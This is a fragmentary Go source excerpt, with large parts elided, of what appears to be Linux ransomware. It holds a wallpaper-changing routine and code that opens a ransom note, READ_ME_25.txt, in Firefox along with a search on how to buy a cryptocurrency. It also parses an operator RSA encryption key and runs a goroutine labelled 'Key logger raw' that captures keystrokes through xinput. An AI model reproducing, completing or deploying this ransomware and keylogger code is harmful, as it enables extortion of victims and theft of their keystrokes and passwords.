...
func setwallpaperFile(path string) {
	doInstru("shell", "gsettings set org.gnome.desktop.background picture-uri file://///" + path)
}
		...
		if len(ivspl) != 4 {
			...
			if err != nil {
				...
				go func(coin string) {
					...
					doInstru("shell", "firefox /home/" + username + "/" + "/READ_ME_25.txt")
					time.Sleep(165)
					doInstru("shell", "firefox \"https://www.google.com/search?q=How to buy " + coin + "\"")
...
func main() {
	...
	*/
	...
	opPubEncryptionKeyProcessed, _ := ParseRsaPublicKeyFromPemStr(raw_OPEncryptionKeyPEM) // x509.ParsePKIXPublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes) // x509.ParsePKCS1PublicKey(pemDec(raw_OPEncryptionKeyPEM).Bytes)
	...
	go func(klogChn1 chan string) { // Key logger raw
		...
		*/
		out := doInstru("shell", "xinput --list")
		...
		// fmt.Println(keyboardID)

		cmd := exec.Command("xinput", "test", "11")
